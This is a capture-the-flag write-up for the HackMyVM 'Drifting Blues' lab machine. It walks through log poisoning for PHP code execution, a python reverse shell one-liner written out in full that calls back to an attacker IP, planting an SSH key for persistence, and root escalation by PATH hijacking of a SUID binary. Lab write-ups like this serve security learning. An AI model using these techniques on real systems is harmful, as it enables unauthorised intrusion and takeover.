# HackMyVM-Drifiting Blues

## Netdiscover

<img src="https://imgur.com/FYGhj3B.png"/>

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-09 00:43 PKT
Nmap scan report for 192.168.1.9
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/eventadmins
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:EE:16:C7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds

```

We have 2 ports open http and ssh and we have robots.txt on the webserver

## PORT 80 (HTTP)

<img src="https://imgur.com/ivQrpgQ.png"/>



## Dirbuster


<img src="https://imgur.com/Sb5Fl3I.png"/>

<img src="https://imgur.com/nd3Epkj.png"/>

Running dirbuster we can see there is `robots.txt` , `secret` and `wp-admin` which tells that there is wordpress running on the machine and these directories are interesting to us.

We visit `robots.txt`

<img src="https://imgur.com/fyBJ5Kg.png"/>

From there we can see it doesn't allow `/eventadmins` to be shown on webcrawlers

<img src="https://imgur.com/Wn7Q9Hs.png"/>

So `john` and `buddyG` might be the two usernames also visiting `littlequeenofspades.html`

<img src="https://imgur.com/Np06NyK.png"/>

We would find a base64 encoded text

<img src="https://imgur.com/mORSKK2.png"/>

On further decoding the text

<img src="https://imgur.com/DEUxRyb.png"/>

We will get a page `adminsfixit.php`

<img src="https://imgur.com/olGutxS.png"/>

Here we can see ssh authorization log which logs about the users when anyone tries to login with a username and gives success or failed attempt message


<img src="https://imgur.com/WBmHoGT.png"/>

As you can see when we interact with SSH it gets log I tried to login with `arz` and it got logged.Now let's try to add php  `GET` paramter which will test if we can get Remote Code Execution or not 

<img src="https://imgur.com/mcfHCLo.png"/>


<img src="https://imgur.com/jElU6gE.png"/>

And it did worked

***Note : My private IP was changed due to a change of network also if your doing something with special characters bash is the way to go , we need to be careful with special characters when using zsh shell. ***


Now I'll check for python if it is installed with `which python` 

<img src="https://imgur.com/g0PT3iv.png"/>

Great now I'll setup the python reverse shell 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.129",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


<img src="https://imgur.com/VMRNQmB.png"/>

And we are in !!!

Stabilize the shell with python

<img src="https://imgur.com/gOSmeAg.png"/>

<img src="https://imgur.com/RY1QIq3.png"/>

This might work differently in zsh shell

<img src="https://imgur.com/RPEQvvZ.png"/>

<img src="https://imgur.com/F4PjV8R.png"/>

Now we find a user named `robertj` and we can write to the `.ssh` directory so generate a ssh key pair with `ssh-keygen` on your host machine and transfer it through wget or python server


<img src="https://imgur.com/tw7iV1X.png"/>

<img src="https://imgur.com/IAKJ0ku.png"/>

As you can see we are hosting the public and private key so we need only public on the target machine and private with us to communicate with it.Copy the contents of `id_rsa.pub` move to target machine and rename it to `authorized_keys` in the `.ssh` folder.

<img src="https://imgur.com/xuw7Wyq.png"/>


## Privilege Escalation

Now let's find if there are SUID binaries on the box

<img src="https://imgur.com/PEcAq9e.png"/>

Through this find command we found a binary named `getinfo` which is not normal to have SUID it belongs to user `root` and group `operator` looking our UID and GID we are in operators group so we can do something with it.

On running the binary 

<img src="https://imgur.com/Hg838jO.png"/>

<img src="https://imgur.com/prHoMxR.png"/>

It basically is running the following commands in the binary

<img src="https://imgur.com/UjVIrzj.png"/>

<img src="https://imgur.com/0vpc9Sd.png"/>

<img src="https://imgur.com/SBszTVR.png"/>

So here what we can do is make a file with the name of `ip` put `/bin/bash` in it make it executable and change the PATH variable which is known as "Exploiting PATH variable"

<img src="https://imgur.com/5d2V89O.png"/>

<img src="https://imgur.com/EMI4TmV.png"/>

And now when we'll run the binary

<img src="https://imgur.com/hd7xEj8.png"/>

We will be root !!!
